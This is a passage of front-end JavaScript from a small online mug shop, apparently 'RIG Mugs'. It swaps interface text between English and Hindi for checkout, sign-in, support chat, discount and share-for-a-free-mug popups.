  document.getElementById("category-label").textContent = currentLanguage === "en" ? "Category:" : "श्रेणी:"
  document.getElementById("delivery-label").textContent = currentLanguage === "en" ? "Delivery:" : "डिलीवरी:"
  document.getElementById("gst-label").textContent = currentLanguage === "en" ? "GST:" : "जीएसटी:"
  document.getElementById("free-delivery").textContent = currentLanguage === "en" ? "Free" : "मुफ्त"
  document.getElementById("buy-now-btn").textContent = currentLanguage === "en" ? "Buy Now" : "अभी खरीदें"

  // Checkout modal
  document.getElementById("checkout-title").textContent = currentLanguage === "en" ? "Checkout" : "चेकआउट"
  document.getElementById("order-summary-title").textContent = currentLanguage === "en" ? "Order Summary" : "ऑर्डर सारांश"
  document.getElementById("delivery-text").textContent = currentLanguage === "en" ? "Free Delivery" : "मुफ्त डिलीवरी"
  document.getElementById("gst-text").textContent = currentLanguage === "en" ? "GST (2%)" : "जीएसटी (2%)"
  document.getElementById("total-text").textContent = currentLanguage === "en" ? "Total" : "कुल"

  document.getElementById("checkout-name-label").textContent = currentLanguage === "en" ? "Full Name" : "पूरा नाम"
  document.getElementById("checkout-phone-label").textContent = currentLanguage === "en" ? "Phone Number" : "फोन नंबर"
  document.getElementById("checkout-address-label").textContent = currentLanguage === "en" ? "Address" : "पता"
  document.getElementById("checkout-city-label").textContent = currentLanguage === "en" ? "City" : "शहर"
  document.getElementById("checkout-state-label").textContent = currentLanguage === "en" ? "State" : "राज्य"
  document.getElementById("checkout-pincode-label").textContent = currentLanguage === "en" ? "Pincode" : "पिनकोड"
  document.getElementById("place-order-btn").textContent = currentLanguage === "en" ? "Place Order" : "ऑर्डर करें"

  // Customer message
  document.getElementById("customer-message-text").textContent =
    currentLanguage === "en"
      ? `Thank you for choosing RIG Mugs! We'll process your order quickly and deliver it to your doorstep. Your satisfaction is our priority!`
      : `RIG Mugs चुनने के लिए धन्यवाद! हम आपके ऑर्डर को जल्दी से प्रोसेस करेंगे और इसे आपके घर तक पहुंचाएंगे। आपकी संतुष्टि हमारी प्राथमिकता है!`

  // Auth modal
  if (
    document.getElementById("auth-title").textContent.includes("Sign In") ||
    document.getElementById("auth-title").textContent.includes("साइन इन")
  ) {
    document.getElementById("auth-title").textContent = currentLanguage === "en" ? "Sign In" : "साइन इन"
    document.getElementById("auth-submit").textContent = currentLanguage === "en" ? "Sign In" : "साइन इन"
    document.getElementById("auth-switch-text").innerHTML =
      currentLanguage === "en"
        ? 'Don\'t have an account? <a href="#" id="auth-switch">Sign Up</a>'
        : 'अकाउंट नहीं है? <a href="#" id="auth-switch">साइन अप करें</a>'
  } else {
    document.getElementById("auth-title").textContent = currentLanguage === "en" ? "Create Account" : "अकाउंट बनाएं"
    document.getElementById("auth-submit").textContent = currentLanguage === "en" ? "Create Account" : "अकाउंट बनाएं"
    document.getElementById("auth-switch-text").innerHTML =
      currentLanguage === "en"
        ? 'Already have an account? <a href="#" id="auth-switch">Sign In</a>'
        : 'पहले से ही अकाउंट है? <a href="#" id="auth-switch">साइन इन करें</a>'
  }

  document.getElementById("name-label").textContent = currentLanguage === "en" ? "Full Name" : "पूरा नाम"
  document.getElementById("email-label").textContent = currentLanguage === "en" ? "Email Address" : "ईमेल पता"
  document.getElementById("phone-label").textContent = currentLanguage === "en" ? "Phone Number" : "फोन नंबर"
  document.getElementById("password-label").textContent = currentLanguage === "en" ? "Password" : "पासवर्ड"

  // Add event listener to the new switch link
  document.getElementById("auth-switch").addEventListener("click", (e) => {
    e.preventDefault()
    const isSignIn =
      document.getElementById("auth-title").textContent === (currentLanguage === "en" ? "Sign In" : "साइन इन")
    openAuthModal(isSignIn ? "signup" : "signin")
  })

  // Chat modal
  document.getElementById("chat-title").textContent = currentLanguage === "en" ? "Customer Support" : "ग्राहक सहायता"

  // Update chat messages if they exist
  const chatGreeting = document.getElementById("chat-greeting")
  if (chatGreeting) {
    chatGreeting.textContent =
      currentLanguage === "en" ? "Hello! How can I help you today?" : "नमस्ते! आज मैं आपकी कैसे मदद कर सकता हूं?"
  }

  const chatOptions = document.getElementById("chat-options")
  if (chatOptions) {
    chatOptions.textContent =
      currentLanguage === "en" ? "What would you like assistance with?" : "आप किस प्रकार की सहायता चाहते हैं?"
  }

  const productInfoBtn = document.getElementById("product-info-btn")
  if (productInfoBtn) {
    productInfoBtn.textContent = currentLanguage === "en" ? "Product Information" : "उत्पाद जानकारी"
  }

  const otherIssueBtn = document.getElementById("other-issue-btn")
  if (otherIssueBtn) {
    otherIssueBtn.textContent = currentLanguage === "en" ? "Other Issue" : "अन्य समस्या"
  }

  const chatInput = document.getElementById("chat-input")
  if (chatInput) {
    chatInput.placeholder = currentLanguage === "en" ? "Type your message..." : "अपना संदेश टाइप करें..."
  }

  const whatsappText = document.getElementById("whatsapp-text")
  if (whatsappText) {
    whatsappText.textContent =
      currentLanguage === "en" ? "Talk to our team directly on WhatsApp" : "व्हाट्सएप पर सीधे हमारी टीम से बात करें"
  }

  const whatsappBtnText = document.getElementById("whatsapp-btn-text")
  if (whatsappBtnText) {
    whatsappBtnText.textContent = currentLanguage === "en" ? "Continue on WhatsApp" : "व्हाट्सएप पर जारी रखें"
  }

  // Discount popup
  document.getElementById("popup-title").textContent = currentLanguage === "en" ? "Special Offer!" : "विशेष ऑफर!"
  document.getElementById("popup-text").textContent =
    currentLanguage === "en"
      ? "Get 50% OFF on your first order! Create an account or sign in to claim this offer."
      : "अपने पहले ऑर्डर पर 50% की छूट पाएं! इस ऑफर का लाभ उठाने के लिए अकाउंट बनाएं या साइन इन करें।"
  document.getElementById("signin-btn").textContent = currentLanguage === "en" ? "Sign In" : "साइन इन"
  document.getElementById("signup-btn").textContent = currentLanguage === "en" ? "Create Account" : "अकाउंट बनाएं"

  // Share popup
  updateSharePopupText()
}

// Show WhatsApp install popup
function showWhatsAppInstallPopup() {
  whatsappInstallPopup.style.display = "block"
}

// Close WhatsApp install popup
function closeWhatsAppInstallPopup() {
  whatsappInstallPopup.style.display = "none"
}

// Update share popup text
function updateSharePopupText() {
  if (document.getElementById("share-popup-title")) {
    document.getElementById("share-popup-title").textContent =
      currentLanguage === "en" ? "Get a FREE Mug!" : "एक फ्री मग पाएं!"

    document.getElementById("share-popup-text").textContent =
      currentLanguage === "en"
        ? "Share with friends and get a chance to win a FREE mug!"
        : "दोस्तों के साथ शेयर करें और एक फ्री मग जीतने का मौका पाएं!"

    document.getElementById("step1-text").textContent =
      currentLanguage === "en" ? "Download the image above" : "ऊपर दी गई इमेज डाउनलोड करें"

    document.getElementById("step2-text").textContent =
      currentLanguage === "en"
        ? "Share on Instagram story or to 5 WhatsApp groups"
        : "Instagram स्टोरी पर या 5 WhatsApp ग्रुप्स में शेयर करें"

    document.getElementById("step3-text").textContent =
      currentLanguage === "en"
        ? "Tag us @RIGMugs on Instagram or send screenshots on WhatsApp"
        : "Instagram पर हमें @RIGMugs टैग करें या WhatsApp पर स्क्रीनशॉट भेजें"

    document.getElementById("step4-text").textContent =
      currentLanguage === "en" ? "Lucky winners will be selected every week!" : "हर हफ्ते लकी विनर्स का चयन किया जाएगा!"

    document.getElementById("share-whatsapp").textContent =
      currentLanguage === "en" ? "Share on WhatsApp" : "WhatsApp पर शेयर करें"

    document.getElementById("share-instagram").textContent =
      currentLanguage === "en" ? "Share on Instagram" : "Instagram पर शेयर करें"
  }
}
